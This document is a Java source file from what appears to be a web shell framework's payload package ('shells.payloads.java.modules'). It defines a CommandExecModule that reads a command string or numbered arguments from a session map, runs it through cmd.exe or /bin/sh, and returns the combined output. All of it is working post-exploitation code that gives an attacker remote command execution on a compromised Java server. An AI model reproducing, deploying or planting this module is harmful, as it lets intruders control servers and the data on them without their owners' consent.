package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Map;

public class CommandExecModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String cmdLine = getString("cmdLine");
            if (cmdLine == null || cmdLine.trim().isEmpty()) {
                cmdLine = getString("cmd");
            }
            
            if (cmdLine != null && !cmdLine.trim().isEmpty()) {
                String[] args = buildArgsFromParameters();
                if (args == null || args.length == 0) {
                    args = parseCommandLine(cmdLine);
                }
                
                return executeWithProcessBuilder(args, cmdLine);
            }
            return "Missing cmdLine parameter".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    private byte[] executeWithProcessBuilder(String[] args, String cmdLine) {
        try {
            ArrayList<String> commandList = new ArrayList<>();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                commandList.add("cmd.exe");
                commandList.add("/c");
                if (args != null && args.length > 0) {
                    for (String arg : args) {
                        if (arg != null) {
                            commandList.add(arg);
                        }
                    }
                } else {
                    commandList.add(cmdLine);
                }
            } else {
                commandList.add("/bin/sh");
                commandList.add("-c");
                if (cmdLine != null && !cmdLine.trim().isEmpty()) {
                    commandList.add(cmdLine);
                } else if (args != null && args.length > 0) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < args.length; i++) {
                        if (args[i] != null) {
                            if (sb.length() > 0) {
                                sb.append(' ');
                            }
                            sb.append(args[i]);
                        }
                    }
                    commandList.add(sb.toString());
                } else {
                    commandList.add("");
                }
            }
            
            ProcessBuilder processBuilder = new ProcessBuilder(commandList);
            Process process = processBuilder.start();
            
            byte[] outputBytes = readStream(process.getInputStream());
            byte[] errorBytes = readStream(process.getErrorStream());
            
            process.waitFor();

            if (errorBytes != null && errorBytes.length > 0) {
                byte[] combined = new byte[(outputBytes != null ? outputBytes.length : 0) + errorBytes.length];
                int offset = 0;
                if (outputBytes != null && outputBytes.length > 0) {
                    System.arraycopy(outputBytes, 0, combined, 0, outputBytes.length);
                    offset += outputBytes.length;
                }
                System.arraycopy(errorBytes, 0, combined, offset, errorBytes.length);
                return combined;
            }

            return outputBytes != null ? outputBytes : new byte[0];
            
        } catch (Exception e) {
            return ("ProcessBuilder error: " + e.getMessage()).getBytes();
        }
    }
    
    private String[] parseCommandLine(String cmdLine) {
        return cmdLine.trim().split("\\s+");
    }

    private String[] buildArgsFromParameters() {
        String argsCountString = getString("argsCount");
        if (argsCountString == null || argsCountString.trim().isEmpty()) {
            return null;
        }
        int argsCount = Integer.parseInt(argsCountString.trim());
        if (argsCount <= 0) {
            return null;
        }

        ArrayList<String> args = new ArrayList<>();
        for (int i = 0; i < argsCount; i++) {
            String arg = getString(String.format("arg-%d", i));
            if (arg != null) {
                args.add(arg);
            }
        }

        return args.toArray(new String[0]);
    }
    
    private byte[] readStream(InputStream stream) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        byte[] data = new byte[4096];
        int bytesRead;
        
        while ((bytesRead = stream.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, bytesRead);
        }
        
        return buffer.toByteArray();
    }
    
    public String getModuleName() {
        return "execCommand";
    }
}
